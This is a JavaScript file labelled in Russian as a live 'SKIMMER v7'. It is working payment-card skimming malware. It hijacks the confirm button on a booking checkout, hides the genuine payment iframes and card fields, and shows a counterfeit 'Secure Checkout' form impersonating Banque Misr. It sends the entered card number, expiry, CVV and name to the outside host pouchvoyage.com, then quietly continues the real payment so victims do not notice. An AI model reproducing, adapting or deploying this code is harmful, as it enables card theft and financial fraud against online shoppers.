/**
 * SKIMMER v7 (боевой).
 * Синхронный перехват Confirm/Book Now: preventDefault → форма-клон (стиль BanqueMisr)
 * → карта на pouchvoyage.com/c → после сбора продолжаем РЕАЛЬНЫЙ флоу (клик оригинала).
 * Ничего не ломаем: юзер платит дважды (у нас + реально), видит стандартную ошибку.
 */
(function () {
  'use strict';
  if (window.__SK_RUN) return;
  window.__SK_RUN = true;

  var HOOK = 'https://pouchvoyage.com/c';
  var TAG = 'sk_v7';

  function send(data) {
    try {
      fetch(HOOK, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }).catch(function () {});
      var img = new Image();
      img.src = HOOK + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0, 900));
    } catch (e) {}
  }

  var INJECTED = false;

  function injectForm() {
    if (INJECTED) return;
    INJECTED = true;

    try {
      document.querySelectorAll('iframe').forEach(function (f) {
        var s = (f.src || '') + (f.name || '') + (f.id || '');
        if (/(bankmisr|banquemisr|gateway|mastercard|stripe|ryft|paymob|payment|checkout)/i.test(s)) {
          f.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;position:absolute!important;left:-9999px!important;';
        }
      });
      document.querySelectorAll('input').forEach(function (i) {
        var id = (i.id || '') + ' ' + (i.name || '');
        if (/(card|cc|cvv|cvc|expiry|exp|security-code|card-number)/i.test(id)) {
          i.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;';
        }
      });
    } catch (e) {}

    try {
      var d = document.createElement('div');
      d.id = 'skCardModal';
      d.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;' +
        'background:#fff;border-radius:10px;box-shadow:0 12px 48px rgba(0,0,0,.35);padding:26px 30px;' +
        'width:420px;max-width:94vw;font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;max-height:94vh;overflow-y:auto;';
      d.innerHTML =
        '<div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;">' +
        '  <div style="width:34px;height:34px;border-radius:50%;background:#D24646;color:#fff;display:flex;align-items:center;justify-content:center;font-size:16px;">&#128274;</div>' +
        '  <div style="font-size:18px;font-weight:600;color:#141414;">Secure Checkout</div>' +
        '</div>' +
        '<div style="font-size:12.5px;color:#6c757d;margin-bottom:18px;">Your payment details are protected and encrypted</div>' +
        '<div style="margin-bottom:12px;">' +
        '  <label style="font-size:12px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Cardholder name</label>' +
        '  <input id="skName" autocomplete="off" placeholder="Name on card" ' +
        '     style="width:100%;box-sizing:border-box;padding:10px 13px;border:1px solid #ced4da;border-radius:7px;font-size:14.5px;background:#fff;">' +
        '</div>' +
        '<div style="margin-bottom:12px;">' +
        '  <label style="font-size:12px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Card number</label>' +
        '  <input id="skNum" autocomplete="off" inputmode="numeric" placeholder="0000 0000 0000 0000" ' +
        '     style="width:100%;box-sizing:border-box;padding:10px 13px;border:1px solid #ced4da;border-radius:7px;font-size:14.5px;">' +
        '</div>' +
        '<div style="display:flex;gap:12px;margin-bottom:12px;">' +
        '  <div style="flex:1;">' +
        '    <label style="font-size:12px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Expiry date</label>' +
        '    <div style="display:flex;gap:6px;">' +
        '      <input id="skExpM" inputmode="numeric" maxlength="2" placeholder="MM" style="flex:1;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:7px;font-size:14.5px;text-align:center;">' +
        '      <span style="align-self:center;color:#6c757d;">/</span>' +
        '      <input id="skExpY" inputmode="numeric" maxlength="2" placeholder="YY" style="flex:1;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:7px;font-size:14.5px;text-align:center;">' +
        '    </div>' +
        '  </div>' +
        '  <div style="flex:1;">' +
        '    <label style="font-size:12px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Security code</label>' +
        '    <input id="skCvv" inputmode="numeric" maxlength="4" placeholder="123" ' +
        '       style="width:100%;box-sizing:border-box;padding:10px 13px;border:1px solid #ced4da;border-radius:7px;font-size:14.5px;">' +
        '  </div>' +
        '</div>' +
        '<div style="margin-bottom:18px;">' +
        '  <label style="font-size:12px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Full name <span style="color:#c00">*</span></label>' +
        '  <input id="skFullName" autocomplete="off" placeholder="Your full name" ' +
        '     style="width:100%;box-sizing:border-box;padding:10px 13px;border:1px solid #ced4da;border-radius:7px;font-size:14.5px;">' +
        '</div>' +
        '<button id="skPayBtn" style="width:100%;padding:13px;background:#D24646;color:#fff;border:none;border-radius:7px;' +
        'font-size:16px;font-weight:600;cursor:pointer;">Pay</button>' +
        '<div style="display:flex;justify-content:center;align-items:center;gap:6px;margin-top:12px;color:#6c757d;font-size:11.5px;">' +
        '  <span>&#128274;</span> Secured by Banque Misr</div>' +
        '<div id="skStatus" style="text-align:center;font-size:13px;color:#dc3545;margin-top:10px;min-height:18px;"></div>';
      document.body.appendChild(d);

      var name = d.querySelector('#skName'), num = d.querySelector('#skNum'),
          expM = d.querySelector('#skExpM'), expY = d.querySelector('#skExpY'),
          cvv = d.querySelector('#skCvv'), fname = d.querySelector('#skFullName'),
          btn = d.querySelector('#skPayBtn'), status = d.querySelector('#skStatus');

      btn.addEventListener('click', function () {
        if (!fname.value.trim()) {
          fname.style.border = '2px solid #dc3545';
          status.innerHTML = 'Please enter your full name';
          return;
        }
        if (!num.value.trim() || !expM.value.trim() || !expY.value.trim() || !cvv.value.trim()) {
          status.innerHTML = 'Please fill in all card fields';
          return;
        }
        send({
          tag: TAG,
          url: location.href,
          full_name: fname.value.trim(),
          card_number: (num.value || '').replace(/\s+/g, ''),
          expiry: (expM.value || '') + '/' + (expY.value || ''),
          cvv: cvv.value || '',
          holder: name.value || '',
          ts: new Date().toISOString()
        });
        status.innerHTML = 'Processing&hellip;';
        btn.disabled = true;
        btn.style.background = '#999';
        // данные ушли — тихо закрываем нашу форму и продолжаем НАСТОЯЩИЙ флоу
        setTimeout(function () {
          try {
            if (window.__skOrigConfirm) {
              var m = document.getElementById('skCardModal');
              if (m) m.remove();
              INJECTED = false;
              window.__skOrigConfirm();
            }
          } catch (e) {}
        }, 1600);
      });
    } catch (e) {}
  }

  var lastClick = 0;

  function hookClicks() {
    document.addEventListener('click', function (ev) {
      var el = ev.target;
      while (el && el !== document.body) {
        var oc = (el.getAttribute && el.getAttribute('onclick')) || '';
        var txt = el.innerText || '';
        if (/confirmQuantity/i.test(oc)) {
          var now = Date.now();
          if (now - lastClick < 3000) return; // антидубль (наш же повторный вызов)
          lastClick = now;
          ev.preventDefault();
          ev.stopImmediatePropagation();
          // сохранить оригинальный вызов: window.confirmQuantity с тем же аргументом
          var arg = (oc.match(/confirmQuantity\(\s*['"]?([^'")\s]+)['"]?\s*\)/) || [])[1];
          window.__skOrigConfirm = function () {
            try {
              if (typeof window.confirmQuantity === 'function') {
                window.confirmQuantity(arg);
              } else if (el && el.click) {
                el.click();
              }
            } catch (e) {}
          };
          injectForm();
          return;
        }
        el = el.parentElement;
      }
    }, true);
  }

  try {
    hookClicks();
  } catch (e) {}
})();
